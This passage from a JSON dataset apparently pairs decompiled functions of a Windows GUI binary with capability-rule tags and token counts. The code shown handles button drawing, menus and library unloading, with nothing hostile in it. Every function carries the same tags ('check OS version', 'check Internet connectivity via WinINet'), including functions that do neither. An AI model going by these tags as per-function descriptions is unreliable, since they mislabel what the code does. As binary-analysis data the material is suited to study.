*var_8h;\n            var_20h = var_8h[1];\n            iVar2 = (**(**(in_EAX + 4) + 0x2c))();\n            var_1ch = iVar2 / *(in_EAX + 0x20) + var_24h;\n            var_18h = (**(**(in_EAX + 4) + 0x20))();\n            var_18h = var_18h + var_20h;\n            fcn.00437d14();\n            fcn.00438084();\n            arg_10h = &var_24h;\n            uVar4 = fcn.00453564();\n            uVar5 = fcn.00421c8c();\n            fcn.00437d14(uVar5);\n            fcn.00437f6c(uVar3, uVar4, arg_10h);\n        }\n    }\n    return;\n}\n",
        "token_count": 662
    },
    "004666a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004666a8(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.00465718();\n    in_EAX[0x67] = iVar1;\n    *(iVar1 + 0x2c) = in_EAX;\n    *(iVar1 + 0x28) = 0x466f00;\n    fcn.0044e820();\n    uVar2 = 0x16;\n    (**(*in_EAX + 0x88))(0x16, 0x17);\n    in_EAX[0x14] = *0x466764;\n    fcn.004456d8();\n    fcn.0044574c();\n    in_EAX[0x69] = 4;\n    in_EAX[0x6b] = -1;\n    *(in_EAX + 0x1a3) = 0;\n    *(in_EAX + 0x6a) = 1;\n    *0x491dd8 = *0x491dd8 + 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 368
    },
    "004667a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004667a0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint uVar10;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_19h;\n    uint uStack25;\n    uint uStack21;\n    uint uStack17;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack84 = &stack0xfffffffc;\n    uStack88 = 0x466bd6;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack92;\n    cVar1 = (**(*in_EAX + 0x50))();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x1b2) = 1;\n        *(in_EAX + 0x1a1) = 0;\n    }\n    else if (*(in_EAX + 0x1b2) == '\\x01') {\n        if ((*(in_EAX + 0x68) == '\\0') || (in_EAX[0x66] == 0)) {\n            *(in_EAX + 0x1b2) = 0;\n        }\n        else {\n            *(in_EAX + 0x1b2) = 3;\n        }\n    }\n    fcn.00421b80();\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if (cVar1 == '\\0') {\n        fcn.00413a94(&var_19h, in_EAX[0x13]);\n        if (*(in_EAX + 0x6c) == '\\0') {\n            uVar2 = 0x2010;\n            if (*(in_EAX + 0x1b2) - 2U < 2) {\n                uVar2 = 0x2210;\n            }\n            uVar2 = fcn.00421c8c(&var_19h, 4, uVar2);\n            sub.user32.dll_DrawFrameControl(uVar2);\n        }\n        else {\n            if ((*(in_EAX + 0x1b2) - 2U < 2) ||\n               (((*(in_EAX + 0x1b1) != '\\0' && (*(in_EAX + 0x1b2) != '\\x01')) || ((*(in_EAX + 7) & 0x10) != 0)))) {\n                uVar2 = fcn.00421c8c(&var_19h, *((*(in_EAX + 0x1b2) - 2U < 2) * 4 + 0x491ddc), \n                                     *(*(in_EAX + 0x6a) * 4 + 0x491de4) | 0xf);\n                sub.user32.dll_DrawEdge(uVar2);\n            }\n            else if (*(in_EAX + 0x6a) == '\\0') {\n                fcn.004214d4();\n                fcn.00421878();\n            }\n            sub.user32.dll_InflateRect(&var_19h, 0xffffffff, 0xffffffff);\n        }\n        if (*(in_EAX + 0x1b2) - 2U < 2) {\n            if ((*(in_EAX + 0x1b2) == '\\x03') && ((*(in_EAX + 0x6c) == '\\0' || (*(in_EAX + 0x1b1) == '\\0')))) {\n                fcn.004285c8();\n                fcn.004214a8();\n                fcn.00421878();\n            }\n            var_8h = 1;\n            var_4h = 1;\n        }\n        else {\n            var_8h = 0;\n            var_4h = 0;\n        }\n        puVar9 = &var_8h;\n        fcn.004455ac();\n        uVar10 = 0;\n        uVar3 = *(in_EAX + 0x1a3);\n        iVar8 = in_EAX[0x6b];\n        iVar7 = in_EAX[0x69];\n        uVar4 = *(in_EAX + 0x1b2);\n        uVar5 = *(in_EAX + 0x6a);\n        uVar2 = fcn.00447efc();\n        puVar6 = &var_38h;\n        fcn.0046647c(puVar6, uVar2, uVar5, uVar4, iVar7, iVar8, uVar3, uVar10, puVar9);\n    }\n    else {\n        fcn.00421c8c();\n        fcn.004422cc();\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            var_9h = '\\x05';\n        }\n        else if (*(in_EAX + 0x1b2) - 2U < 2) {\n            var_9h = '\\x04';\n        }\n        else if (*(in_EAX + 0x1b1) == '\\0') {\n            var_9h = '\\x02';\n        }\n        else {\n            var_9h = '\\x03';\n        }\n        cVar1 = '\\0';\n        if (*(in_EAX + 0x6c) != '\\0') {\n            if (var_9h == '\\x02') {\n                cVar1 = '\\x02';\n            }\n            else if (var_9h == '\\x03') {\n                cVar1 = '\\x03';\n            }\n            else if (var_9h == '\\x04') {\n                cVar1 = '\\x04';\n            }\n            else if (var_9h == '\\x05') {\n                cVar1 = '\\x05';\n            }\n        }\n        (**(*in_EAX + 0x44))();\n        if (cVar1 == '\\0') {\n            fcn.00437d14();\n            fcn.00438084();\n            puVar6 = &var_19h;\n            uVar10 = 0;\n            uVar2 = fcn.00421c8c();\n            fcn.00437d14(uVar2);\n            fcn.00437f28(uVar10, puVar6);\n            puVar6 = &var_19h;\n            puVar9 = &var_38h;\n            uVar2 = fcn.00421c8c();\n            fcn.00437d14(uVar2);\n            fcn.00437e8c(puVar9, puVar6);\n            var_19h = var_38h;\n            uStack25 = uStack56;\n            uStack21 = uStack52;\n            uStack17 = uStack48;\n        }\n        else {\n            fcn.00437d14();\n            fcn.00438348();\n            puVar6 = &var_19h;\n            uVar10 = 0;\n            uVar2 = fcn.00421c8c();\n            fcn.00437d14(uVar2);\n            fcn.00437f28(uVar10, puVar6);\n            puVar6 = &var_19h;\n            puVar9 = &var_38h;\n            uVar2 = fcn.00421c8c();\n            fcn.00437d14(uVar2);\n            fcn.00437e8c(puVar9, puVar6);\n            var_19h = var_38h;\n            uStack25 = uStack56;\n            uStack21 = uStack52;\n            uStack17 = uStack48;\n        }\n        if (var_9h == '\\x04') {\n            if (cVar1 != '\\0') {\n                fcn.00420c18();\n            }\n            fcn.00413a6c();\n        }\n        else {\n            fcn.00413a6c();\n        }\n        puVar9 = &var_8h;\n        fcn.004455ac();\n        uVar10 = 0;\n        uVar3 = *(in_EAX + 0x1a3);\n        iVar8 = in_EAX[0x6b];\n        iVar7 = in_EAX[0x69];\n        uVar4 = *(in_EAX + 0x1b2);\n        uVar5 = *(in_EAX + 0x6a);\n        uVar2 = fcn.00447efc();\n        puVar6 = &var_38h;\n        fcn.0046647c(puVar6, uVar2, uVar5, uVar4, iVar7, iVar8, uVar3, uVar10, puVar9);\n    }\n    *in_FS_OFFSET = puVar6;\n    fcn.00404dc4(0x466bdd);\n    return;\n}\n",
        "token_count": 2076
    },
    "00466be4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00466be4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uchar auStack16 [8];\n    \n    if (*(in_EAX + 0x6c) != '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 != '\\0') {\n            sub.user32.dll_GetCursorPos(auStack16);\n            piVar2 = fcn.00443aec();\n            *(in_EAX + 0x1b1) = in_EAX != piVar2;\n            if (in_EAX != piVar2) {\n                fcn.00446870(0);\n            }\n            else {\n                fcn.00446870(0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00466c74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00466c74(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char in_DL;\n    uint var_1h;\n    \n    fcn.00447134(arg_8h, arg_ch);\n    if (in_DL == '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x68) == '\\0') {\n                *(in_EAX + 0x1b2) = 2;\n                (**(*in_EAX + 0x80))();\n            }\n            *(in_EAX + 0x1a1) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00466cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00466cd0(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    char var_2h;\n    uint var_1h;\n    \n    fcn.00447400(arg_8h);\n    if (*(in_EAX + 0x1a1) == '\\0') {\n        if (*(in_EAX + 0x1b1) == '\\0') {\n            fcn.00466be4();\n        }\n    }\n    else {\n        if (*(in_EAX + 0x68) == '\\0') {\n            var_2h = '\\0';\n        }\n        else {\n            var_2h = '\\x03';\n        }\n        if (-1 < in_ECX) {\n            iVar1 = fcn.00444f18();\n            if ((in_ECX < iVar1) && (-1 < arg_8h)) {\n                iVar1 = fcn.00444f5c();\n                if (arg_8h <= iVar1) {\n                    if (*(in_EAX + 0x68) == '\\0') {\n                        var_2h = '\\x02';\n                    }\n                    else {\n                        var_2h = '\\x03';\n                    }\n                }\n            }\n        }\n        if (var_2h != *(in_EAX + 0x1b2)) {\n            *(in_EAX + 0x1b2) = var_2h;\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00466d78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.00466d78(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint var_2h;\n    \n    fcn.004474ac(arg_8h, arg_ch);\n    if (*(in_EAX + 0x1a1) != '\\0') {\n        *(in_EAX + 0x1a1) = 0;\n        if ((((arg_ch < 0) || (iVar2 = fcn.00444f18(),  iVar2 <= arg_ch)) || (arg_8h < 0)) ||\n           (iVar2 = fcn.00444f5c(),  iVar2 < arg_8h)) {\n            bVar1 = false;\n        }\n        else {\n            bVar1 = true;\n        }\n        if (in_EAX[0x66] == 0) {\n            *(in_EAX + 0x1b2) = 0;\n            *(in_EAX + 0x1b1) = 0;\n            if ((bVar1) && (1 < *(in_EAX + 0x1b2) - 2U)) {\n                (**(*in_EAX + 0x80))();\n            }\n        }\n        else if (bVar1) {\n            fcn.00466f48();\n            if (*(in_EAX + 0x68) != '\\0') {\n                (**(*in_EAX + 0x84))();\n            }\n        }\n        else {\n            if (*(in_EAX + 0x68) != '\\0') {\n                *(in_EAX + 0x1b2) = 3;\n            }\n            (**(*in_EAX + 0x84))();\n        }\n        if (bVar1) {\n            fcn.00404154();\n        }\n        fcn.00466be4();\n        return;\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "00466f10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00466f10(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x198) != 0) && (*(in_EAX + 0x30) != 0)) {\n        fcn.00449578(0xb018, *(in_EAX + 0x198));\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00466f48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466f48(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x66] == 0) {\n        param_2 = '\\0';\n    }\n    if ((param_2 != *(in_EAX + 0x68)) && ((*(in_EAX + 0x68) == '\\0' || (*(in_EAX + 0x1a2) != '\\0')))) {\n        *(in_EAX + 0x68) = param_2;\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x1b2) = 0;\n            (**(*in_EAX + 0x84))();\n        }\n        else {\n            if (*(in_EAX + 0x1b2) == '\\0') {\n                (**(*in_EAX + 0x80))();\n            }\n            *(in_EAX + 0x1b2) = 3;\n        }\n        if (param_2 != '\\0') {\n            fcn.00466f10();\n        }\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "00467170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467170(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4671f9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.004455ac();\n    cVar1 = fcn.00458370();\n    if (cVar1 != '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if ((((cVar1 != '\\0') && (*(in_EAX + 0x57) != '\\0')) && (in_EAX[0xc] != 0)) && (*(in_EAX[0xc] + 0x1da) != '\\0'))\n        {\n            fcn.00404154();\n            *(param_2 + 0xc) = 1;\n            goto code_r0x004671e3;\n        }\n    }\n    (**(*in_EAX + -0x10))();\ncode_r0x004671e3:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x467200;\n    uStack24 = 0x4671f8;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 333
    },
    "0046897c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046897c(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x371) == '\\0') && (*(in_EAX + 0x370) != '\\0')) {\n        puStack44 = 0x4689b8;\n        iVar6 = fcn.0044bb7c();\n        if ((iVar6 != 0) && ((*param_2 != *(in_EAX + 0x48) || (*param_1 != *(in_EAX + 0x4c))))) {\n            iVar6 = *param_2;\n            iVar8 = *param_1;\n            cVar1 = *(in_EAX + 0x370);\n            if (cVar1 != '\\0') {\n                if (cVar1 == '\\x01') {\n                    iVar8 = iVar8 + *(in_EAX + 0x368);\n                }\n                else {\n                    if (cVar1 != '\\x02') {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + *(in_EAX + 0x36c);\n                }\n                *(in_EAX + 0x360) = *(in_EAX + 0x48);\n                *(in_EAX + 0x364) = *(in_EAX + 0x4c);\n                puStack44 = 0x468a47;\n                piVar7 = fcn.0044bb90();\n                iVar2 = *(in_EAX + 0x48);\n                iVar3 = piVar7[0x12];\n                iVar4 = *(in_EAX + 0x4c);\n                iVar5 = piVar7[0x13];\n                *(in_EAX + 0x371) = 1;\n                uStack48 = 0x468ab7;\n                iStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                iVar8 = iVar8 - (iVar4 - iVar5);\n                puStack44 = &stack0xfffffffc;\n                (**(*piVar7 + 0x88))(iVar8, iVar6 - (iVar2 - iVar3));\n                *in_FS_OFFSET = iVar8;\n                *(in_EAX + 0x371) = 0;\n                return in_EAX;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 650
    },
    "00468b28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00468b28(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.0044d1c8(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n        sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n        sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n        sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00468d84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00468d84(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x468dc9;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4965dc = *0x4965dc + 1;\n    if (*0x4965dc == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x491e2c != 0) {\n            iStack20 = *0x491e2c;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00404da0();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 226
    },
    "00468dd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00468dd4(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x468e18;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4965e0 = *0x4965e0 + 1;\n    if (((*0x4965e0 == 0) && (*0x4965e8 != '\\0')) && (*0x4965e4 != 0)) {\n        iStack20 = *0x4965e4;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 193
    },
    "0046cb64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0046cb64(void)\n\n{\n    if (*0x4965f8 == 0) {\n        *0x4965f8 = fcn.0040cdf4();\n    }\n    return *0x4965f8;\n}\n",
        "token_count": 58
    },
    "0046d264": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0046d264(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    fcn.00444c6c();\n    fcn.00444ca0();\n    fcn.0044d498();\n    *(in_EAX + 0x50) = *0x46d320;\n    iVar1 = fcn.00403f28();\n    *(in_EAX + 0x270) = iVar1;\n    *(iVar1 + 0x18) = in_EAX;\n    uVar2 = fcn.00421624();\n    *(in_EAX + 0x250) = uVar2;\n    fcn.00443e20();\n    iVar1 = fcn.00403f28();\n    *(in_EAX + 600) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x46d6dc;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 353
    },
    "0046d558": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046d558(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x2a2) == 0) {\n        fcn.00421878();\n    }\n    else {\n        (**(in_EAX + 0x2a0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0046d6fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046d6fc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack24 = &fcn.0046d6fc::var_1h + 1;\n    uStack28 = 0x46d77a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_1h._0_1_ = param_2 != *(in_EAX + 0x260);\n    if (var_1h) {\n        if ((param_2 == '\\0') && ((*(in_EAX + 0x26e) == '\\x02' || (*(in_EAX + 0x26e) == '\\x03')))) {\n            fcn.00406a50();\n            fcn.0046cce4();\n        }\n        *(in_EAX + 0x260) = param_2;\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x26c) = 0;\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46d781;\n    uStack28 = 0x46d779;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 351
    },
    "0046d7fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d7fc(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46d87d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (param_2 != *(in_EAX + 0x26d)) {\n        puVar1 = &stack0xfffffffc;\n        if ((param_2 != '\\0') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x26e) != '\\0')) {\n            fcn.00406a50();\n            fcn.0040c5ac();\n            fcn.004047cc();\n            puVar1 = puStack20;\n        }\n        puStack20 = puVar1;\n        (**(*in_EAX + 200))();\n        *(in_EAX + 0x26d) = param_2;\n        fcn.00449ecc();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x46d884;\n    uStack24 = 0x46d87c;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 322
    },
    "0046d95c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d95c(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x46d9e7;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (param_2 != *(in_EAX + 0x26e)) {\n        puVar1 = &stack0xfffffffc;\n        if ((param_2 != '\\0') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x26d) != '\\0')) {\n            fcn.00406a50();\n            fcn.0040c5ac();\n            fcn.004047cc();\n            param_2 = extraout_DL;\n            puVar1 = puStack16;\n        }\n        puStack16 = puVar1;\n        *(in_EAX + 0x26e) = param_2;\n        if ((*(in_EAX + 0x260) == '\\0') && ((param_2 == '\\x02' || (param_2 == '\\x03')))) {\n            fcn.0046d6fc();\n        }\n        fcn.00449ecc();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x46d9ee;\n    uStack20 = 0x46d9e6;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 379
    },
    "0046dab8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0046dab8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x278) == '\\0') {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0044d1c8(5, 0, CONCAT22(*(in_EAX + 0x4c), *(in_EAX + 0x48)));\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n        fcn.0044909c();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0046df98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
